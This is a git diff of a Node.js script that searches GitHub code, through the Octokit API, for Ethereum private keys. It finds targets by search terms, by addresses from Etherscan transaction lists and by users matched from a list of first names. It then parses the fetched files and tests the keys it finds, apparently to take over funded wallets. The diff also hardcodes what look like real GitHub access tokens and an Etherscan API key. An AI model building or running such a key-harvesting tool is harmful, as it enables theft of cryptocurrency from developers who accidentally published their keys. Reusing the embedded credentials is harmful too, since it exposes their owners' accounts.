@@ -6,7 +6,8 @@ const Web3 = require("web3")
 const Promise = require("bluebird")
 const { throttling } = require("@octokit/plugin-throttling");
 const { retry } = require("@octokit/plugin-retry");
-const gitApiKey = "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"
+const names = require('./names.json')
+const gitApiKey = "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"
 //const gitApiKey = "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"
 const etherscanApiKey = "KIP9EMNW2G9Y23TPCS21H6JGD6I9I2WW7T"
 const etherscanAPI = require("etherscan-api").init(etherscanApiKey)
@@ -39,30 +40,34 @@ const getBlock = async () => {
 }
 
 const searchForPrivKeysViaEtherscan = async (address, page) => {
-       let transactions = await etherscanAPI.account.txlist('0x4B6a81549fe3650Faad6a3658F62cBbb1CB6f09b', 1, 'latest', 1, 100, 'dsc')
+       let transactions = await etherscanAPI.account.txlist('0x8d12A197cB00D4747a1fe03395095ce2A5CC6819', 1, 'latest', 1, 100, 'asc')
   let addresses = new Set(transactions.result.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
   
   return Promise.map(addresses, async address => {
-         let query = 'eth ${address}'
+         let query = 'privateKey ${address}'
       setTimeout(() => {
           octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:100}).then(res => {
          let items = res.data.items
             console.log(address, items.length)
          return items.map(async item=> {
-           
-           const content = await octo.rest.git.getBlob({
-             owner: item.repository.owner.login,
-             repo: item.repository.name,
-             file_sha: item.sha
-           })
-           //console.log(content)
-           const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
-           //console.log(codeFile)
-          // console.log("keys")
-           let keys = parseForPrivateKeys(codeFile)
-          // console.log(keys)
-         //  console.log("---------")
-           testPrivateKeys(keys)
+           try {
+            const content = await octo.rest.git.getBlob({
+              owner: item.repository.owner.login,
+              repo: item.repository.name,
+              file_sha: item.sha
+            })
+            //console.log(content)
+            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
+            //console.log(codeFile)
+            // console.log("keys")
+            let keys = parseForPrivateKeys(codeFile)
+            //console.log(keys)
+          //  console.log("---------")
+            testPrivateKeys(keys)
+          }
+          catch(err) {
+            console.log(err)
+          }
            
          })
             
@@ -72,10 +77,12 @@ const searchForPrivKeysViaEtherscan = async (address, page) => {
     })
   }
 
-const searchProfilesForPrivateKeys = async (page) => {
+const searchProfilesForPrivateKeys = async (page, name, per_page) => {
   let apiCalls = 0
-  let firstName = "Matt"
-  octo.rest.search.users({q:firstName, order:"asc", page, per_page:1}).then(res => {
+  if(!name) {
+    return
+  }
+  octo.rest.search.users({q:name, order:"asc", page, per_page}).then(res => {
     apiCalls += 1
     let profiles = res.data.items
    // console.log(profiles)
@@ -93,7 +100,7 @@ const searchProfilesForPrivateKeys = async (page) => {
      let results = await octo.rest.search.code(query)
       let codeSnippets = results.data.items
       if(codeSnippets.length !== 0) {
-         console.log("working with", codeSnippets.length)
+         console.log("parsing 30 code files for private key", codeSnippets.length)
       Promise.each(codeSnippets, async snippet => {
         apiCalls += 1 
         //console.log("api calls ", apiCalls)//console.log(Object.keys(snippet))
@@ -108,20 +115,20 @@ const searchProfilesForPrivateKeys = async (page) => {
         let keys = parseForPrivateKeys(codeFile)
        // console.log(keys)
         testPrivateKeys(keys)
-           searchProfilesForPrivateKeys(page+=1)
+           searchProfilesForPrivateKeys(page+=1, name, per_page)
       })
     }
       else {
-           searchProfilesForPrivateKeys(page+=1)
+           searchProfilesForPrivateKeys(page+=1, name, per_page)
       }
 
     })
-  })
+  }).catch(console.log)
 }
 
   const searchForPrivKeysViaGithub = async (page) => {
     
-    let query = 'web3 sendTransaction ETH'
+    let query = 'priv CORE'
       setTimeout(() => {
           octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:30}).then(async res => {
          let items = res.data.items
@@ -154,6 +161,9 @@ const searchProfilesForPrivateKeys = async (page) => {
     
   }
 
+//searchPrivKeysViaEtherscan()
+// searchForPrivKeysViaEtherscan()
+
 
 
 const ethContractAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"
@@ -164,7 +174,7 @@ const testAddress = "0xd83eB40979cA0Dabe945E22629A72765dc9A39bD"
 
 //searchForPrivKeysViaGithub(testAddress, page)
 
-//searchProfilesForPrivateKeys(1)
+
 
 let network = "rinkeby"
 
@@ -191,3 +201,8 @@ while(true){
 //getBlock().then(console.log)
 //console.log("got block number", block)
 //ethAPI.account.txList().then(console.log)
+
+//searchProfilesForPrivateKeys(1, 'Harry', 30)
+// for(let i=0; i< names.length; i++) {
+//   searchProfilesForPrivateKeys(1, names[i])
+// }
